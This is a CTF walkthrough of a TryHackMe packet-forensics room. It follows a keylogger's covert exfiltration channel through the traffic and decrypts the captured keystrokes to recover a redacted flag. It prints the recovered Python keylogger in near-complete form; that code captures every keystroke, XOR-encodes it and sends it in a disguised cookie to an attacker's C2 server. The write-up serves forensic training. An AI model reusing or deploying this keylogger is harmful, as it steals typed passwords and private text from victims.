# Packed Light Walkthrough

## Intro
Welcome to the Packed Light challenge, here is the link to the [room](https://tryhackme.com/room/hh-packedlight-02e5330c) on TryHackMe.

This is an easy level challenge about netowrk packets investigation and a bit or reversing of an unsafe enccryption.

*"Tiny packets. Odd hours. Suspiciously regular. Someone's smuggling out the data equivalent of a hotel towel every night, folded neatly inside traffic that looks ordinary until you decode it.*

*A short capture from the guest network is all VERA could pull before the connection dropped. Somewhere in that traffic, a quiet little errand is running on a loop, and it isn't part of any service the hotel actually offers."*

 
Analyze the provided capture for a covert communication channel.

Let's begin!

<br/>
<br/>

## The Challenge
When you feel ready download the task archive and extract the files:
```bash
unzip packed-light-forensics.zip
```

We can take a quick overview of the network capture with this python script i built:
- Pull it from GitHub (no dependencies required):
```bash
wget https://raw.githubusercontent.com/Maat-Cyber/Maat-Cyber-World/refs/heads/main/Python-Scripts/Quick-PCAP-Analyzer.py
```

- View network capture summary:
```bash
python3 Quick-PCAP-Analyzer.py traffic.pcapng
```

It shows a ton of interesting data, from there we can see  that a specific host gets contacted frequently passing a custom cookie.

We can also see a GET request for a python script:
```http
GET http://byte-lotus-hotel.thm:8080/temp/updates.py
```

<br>

We can now target it directly, let's open the traffic capture with *WireShark* now and on packet 13 we spot that request.
Right click and choose "follow TCP stream".

Following the stream of packet 13 we find a python script for a C2 server:
```python
GET /temp/updates.py HTTP/1.1
Host: byte-lotus-hotel.thm:8080
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Accept-Encoding: gzip, deflate


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.2
Date: Wed, 17 Jun 2026 05:38:38 GMT
Content-type: text/x-python
Content-Length: 1086
Last-Modified: Wed, 17 Jun 2026 05:30:02 GMT

import requests
import base64
from pynput import keyboard

C2_URL = "http://byte-lotus-hotel.thm:8080/"

def getkey():
    p1 = "H0t3lSt@ff0Nly"
    p2 = "K3epS3cr3t!"
    return p1 + p2

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def sendltr(character):
    raw_bytes = character.encode('utf-8')
    encrypted = xor(raw_bytes, getkey().encode('utf-8'))
    
    b64_string = base64.b64encode(encrypted).decode('utf-8')
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) ByteLotusClient/1.1",
        "Cookie": f"hotel_sess_state={b64_string}"
    }    
    try:
        requests.get(C2_URL, headers=headers, timeout=0.5)
    except:
        pass

def on_press(key):
    try:
        sendltr(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            sendltr(" ")
        elif key == keyboard.Key.enter:
            sendltr("\n")

print("[*] Byte Lotus Sync Service started...")
with keyboard.Listen
```

Let's break down what this script does:
- `http://byte-lotus-hotel.thm:8080/`: is the attacker's server where the keystrokes are being sent.

+ `getkey()`: returns the hardcoded XOR encryption key: "H0t3lSt@ff0Nly" + "K3epS3cr3t!" = `H0t3lSt@ff0NlyK3epS3cr3t!`

- `xor(data: bytes, key: bytes) -> bytes`: a simple XOR cipher, it iterates through each byte of the data and XORs it with the corresponding byte of the key (looping the key if the data is longer than the key).

+ `sendltr(character)`:
    1. Takes a single typed character and converts it to UTF-8 bytes.
    2. Encrypts those bytes using the xor function and the key from `getkey()`.
    3. Base64-encodes the resulting encrypted bytes.
    4. Crafts an HTTP GET request with a spoofed User-Agent (`ByteLotusClient/1.`1) and places the Base64-encoded, XOR-encrypted character inside a cookie `hotel_sess_state`.
    5. Sends the request to the C2 URL with a 0.5s timeout to avoid delaying the victim's typing, silently ignoring any network errors.

- `on_press(key)`: callback function for the keyboard listener.
    1. It tries to capture standard characters (`key.char`). 
    2. If a special key is pressed (which raises an `AttributeError` because it has no `.char` attribute), it specifically checks for the Spacebar and Enter keys, converting them to " " and "\n" respectively. Other special keys (like Shift or Ctrl) are ignored.

+ `with keyboard.Listen...`: starts the background process that listens for keystrokes indefinitely.

<br/>

Let's filter for the packets congaing the cookie:
```
http.host contains "byte-lotus-hotel.thm" or http.cookie contains "hotel_sess_state"
```

We can see that the cookie contains 4 base64 encoded chars each.

Dump the cookies values:
```bash
tshark -r traffic.pcapng -Y 'http.cookie contains "hotel_sess_state"' -T fields -e http.cookie | sed 's/.*hotel_sess_state=//' > base64_strings.txt
```

Reconstruct the base64 payload and XOR decrypt it with the pass we found in the upload script.

Here i built a little Python script to automate the creation of the base64 complete string, decode it and finally XOR decrypt with the key:
```python
import base64

KEY = b"H0t3lSt@ff0NlyK3epS3cr3t!"

def xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

def main():
    try:
        # Read all non-empty lines at once
        with open('b64_strings.txt') as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("[!] Error: b64_strings.txt not found.")
        return

    print("[*] Decrypting keystrokes...")
    decoded_chars = []

    for i, line in enumerate(lines):
        try:
            enc_bytes = base64.b64decode(line)
            dec_bytes = xor(enc_bytes, KEY)
            decoded_chars.append(dec_bytes.decode('utf-8'))
        except Exception as e:
            print(f"[!] Skipping bad line {i+1}: {e}")

    print("\n[+] Decoded Message:")
    print("".join(decoded_chars))

if __name__ == "__main__":
    main()
```

Save it as `decrypt.py` and run:
```bash
python3 decrypt.py
```

And here we have the flag:

--> REDACTED

<br/>
<br/>

Congratulations, you have successfully uncovered all the attacker's steps and reversed the encryption to restore the flag.

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
